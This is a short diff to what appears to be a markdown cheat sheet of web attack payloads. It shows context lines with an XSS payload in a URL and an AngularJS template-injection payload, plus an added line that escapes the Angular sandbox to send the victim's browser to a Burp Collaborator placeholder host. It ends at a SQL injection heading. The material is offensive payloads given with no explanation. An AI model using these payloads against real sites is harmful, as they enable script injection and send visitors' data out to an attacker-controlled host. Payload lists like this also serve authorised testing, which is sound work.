@@ -141,6 +141,8 @@ http://xxxxx.com?&apos;-alert(414)-&apos;
 
 //angular
 {{$on.constructor('alert(1)')()}}
+{{$on.constructor('document.location=`http://<BURP-COLLABORATOR-URL>/`')()}}
+
 ```
 
 ## SQL Injection Section
